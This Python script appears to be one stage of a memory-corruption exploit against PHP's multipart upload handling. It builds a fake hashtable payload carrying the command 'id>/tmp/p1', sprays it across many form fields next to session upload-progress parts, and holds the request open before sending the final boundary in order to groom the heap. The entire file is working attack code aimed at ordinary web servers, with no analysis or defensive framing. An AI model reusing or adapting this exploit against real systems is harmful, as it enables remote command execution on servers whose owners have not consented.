#!/usr/bin/env python3
"""Send stage-3 B allocations, then hold before the final multipart boundary."""

import argparse
import socket
import time

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--path", default="/index.php")
    parser.add_argument("--htdata", type=lambda value: int(value, 0), default=0x1000)
    parser.add_argument("--marker", default="MARK855")
    parser.add_argument("--fillers", type=int, default=0)
    parser.add_argument("--filler-value-length", type=int, default=15)
    parser.add_argument("--carrier-length", type=int, default=15)
    parser.add_argument("--no-progress", action="store_true")
    parser.add_argument("--hold", type=float, default=15.0)
    args = parser.parse_args()

    ex = exploit.Exploit(None, "id>/tmp/p1", profile="bookworm", verbose=False)  # type: ignore[arg-type]
    ht, _ref = ex._fake_payload(args.htdata, args.htdata + 0x100)
    mutable = bytearray(ht)
    mutable[0x60:0x60 + len(args.marker)] = args.marker.encode()
    ht = bytes(mutable)
    carrier = (b"CARRY855" + b"Z" * max(0, args.carrier_length - 8))[
        : args.carrier_length
    ]
    parts = []
    if not args.no_progress:
        parts += [
            {"name": "PHPSESSID", "data": exploit.SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
    for i in range(args.fillers):
        parts.append(
            {"name": f"x{i:04d}", "data": b"Z" * args.filler_value_length}
        )
    parts += [
        {"name": "f00", "data": carrier},
        {"name": "f01", "data": carrier},
        {"name": "g00", "data": carrier},
    ]
    for i in range(15):
        parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    body = exploit.build_multipart(parts, b"B" * 10)
    suffix = b"--" + b"B" * 10 + b"--\r\n"
    if body.endswith(suffix):
        body = body[:-len(suffix)]
    headers = (
        f"POST {args.path} HTTP/1.1\r\n"
        f"Host: {args.host}:{args.port}\r\n"
        "Content-Type: multipart/form-data; boundary=" + "B" * 10 + "\r\n"
        f"Content-Length: {len(body) + len(suffix)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    sock = socket.create_connection((args.host, args.port), timeout=30)
    sock.settimeout(30)
    try:
        sock.sendall(headers + body)
        print(f"holding {args.hold}s with {len(body)} body bytes", flush=True)
        time.sleep(args.hold)
        sock.sendall(suffix)
        try:
            while sock.recv(65536):
                pass
        except OSError:
            pass
    finally:
        sock.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
